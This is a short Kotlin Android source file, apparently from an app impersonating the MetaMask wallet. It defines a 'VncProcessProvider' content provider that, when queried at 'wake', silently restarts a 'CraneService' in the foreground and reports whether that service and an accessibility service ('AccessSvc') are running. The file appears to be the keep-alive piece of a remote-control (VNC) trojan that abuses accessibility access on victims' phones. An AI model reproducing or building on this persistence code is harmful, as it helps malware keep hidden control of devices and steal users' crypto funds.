package com.example.MetaMask.services

import android.content.ContentProvider
import android.content.ContentValues
import android.content.Intent
import android.database.Cursor
import android.database.MatrixCursor
import android.net.Uri
import android.os.Build

class VncProcessProvider : ContentProvider() {

    companion object {
        private const val TAG = "VncProcessProvider"
        const val PATH_WAKE = "wake"
    }

    override fun onCreate(): Boolean = true

    override fun query(
        uri: Uri, projection: Array<String>?, selection: String?,
        selectionArgs: Array<String>?, sortOrder: String?
    ): Cursor? {
        val ctx = context ?: return null
        if (uri.lastPathSegment == PATH_WAKE) {
            android.util.Log.d("XDBG", "[VncProcessProvider] if branch") //xdbg
            val craneAlive = CraneService.instance != null
            val accessAlive = AccessSvc.instance != null

            if (!craneAlive) {
                android.util.Log.d("XDBG", "[VncProcessProvider] if branch") //xdbg
                try {
                    val intent = Intent(ctx, CraneService::class.java)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(intent)
                    else ctx.startService(intent)
                } catch (_: Exception) {}
            }
            val cursor = MatrixCursor(arrayOf("crane_alive", "access_svc_alive"))
            cursor.addRow(arrayOf(if (craneAlive) 1 else 0, if (accessAlive) 1 else 0))
            android.util.Log.d("XDBG", "[VncProcessProvider] return") //xdbg
            return cursor
        }
        android.util.Log.d("XDBG", "[VncProcessProvider] return") //xdbg
        return null
    }

    override fun getType(uri: Uri): String? = null
    override fun insert(uri: Uri, values: ContentValues?): Uri? = null
    override fun delete(uri: Uri, selection: String?, selectionArgs: Array<String>?) = 0
    override fun update(uri: Uri, values: ContentValues?, selection: String?, selectionArgs: Array<String>?) = 0
}
